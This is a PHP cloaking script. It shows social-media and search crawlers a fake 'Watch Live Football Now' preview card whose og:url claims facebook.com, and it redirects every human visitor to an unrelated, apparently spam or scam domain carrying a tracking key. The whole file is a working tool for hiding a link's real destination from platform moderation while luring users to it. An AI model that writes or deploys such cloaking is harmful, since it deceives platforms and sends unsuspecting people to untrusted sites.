<?php
// --- Universal Bot Detector --- //
function isBot($ua) {
    $bots = [
        'Twitterbot',
        'facebookexternalhit',
        'LinkedInBot',
        'Pinterest',
        'Slackbot',
        'WhatsApp',
        'TelegramBot',
        'Googlebot',
        'bingbot',
        'Yahoo! Slurp',
        'DuckDuckBot',
        'Baiduspider',
        'YandexBot',
        'Facebot',
        'ia_archiver' // Alexa
    ];

    foreach ($bots as $bot) {
        if (stripos($ua, $bot) !== false) {
            return true;
        }
    }
    return false;
}

// --- Detect User-Agent --- //
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

if (isBot($ua)) {
    // --- Bot হলে Meta Preview দেখাবে --- //
    ?>
    <!doctype html>
    <html lang="en">
    <head>
      <meta charset="utf-8">
      <title>Watch Live Football Now</title>

      <!-- Open Graph -->
      <meta property="og:title" content="🔥Watch Live Football Now! La Liga, Premier League & More⚽" />
      <meta property="og:description" content="Live 100M+ viewers watching" />
      <meta property="og:image" content="https://raw.githubusercontent.com/kindwordai/images/main/555.jpg" />
      <meta property="og:url" content="https://facebook.com" />

      <!-- Twitter Card -->
      <meta name="twitter:card" content="summary_large_image">
      <meta name="twitter:title" content="🔥Watch Live Football Now! La Liga, Premier League & More⚽" />
      <meta name="twitter:description" content="Live 100M+ viewers watching" />
      <meta name="twitter:image" content="https://raw.githubusercontent.com/kindwordai/images/main/555.jpg" />
    </head>
    <body>
      <h1>Social Preview Page</h1>
      <p>If you are seeing this, you are a crawler (Twitter / FB / Google / etc.).</p>
    </body>
    </html>
    <?php
} else {
    // --- Normal user হলে redirect --- //
    header("Location: https://forgavedisciplinetolerance.com/efs91qh7?key=14d0414f871e75aa0cf508de7021d167");
    exit;
}
?>

